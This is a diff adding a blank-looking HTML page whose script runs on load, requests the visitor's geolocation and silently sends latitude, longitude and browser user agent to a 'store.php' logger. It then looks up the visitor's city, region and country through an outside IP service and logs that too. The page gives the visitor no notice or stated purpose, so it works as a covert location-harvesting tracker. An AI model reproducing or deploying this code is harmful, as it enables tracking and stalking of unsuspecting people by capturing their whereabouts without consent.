@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+
+<body onload="getLocation()">
+
+    <p id="demo"></p>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                document.getElementById("demo").innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            const xhttp = new XMLHttpRequest();
+            xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude +
+                "&uagent=" + encodeURIComponent(navigator.userAgent));
+            xhttp.send();
+
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ipLocation = `IP-based location: ${data.city}, ${data.region}, ${data.country_name}`;
+                    xhttp.open("GET", "store.php?iplocation=" + encodeURIComponent(ipLocation));
+                    xhttp.send();
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+    </script>
+
+</body>
+
+</html>
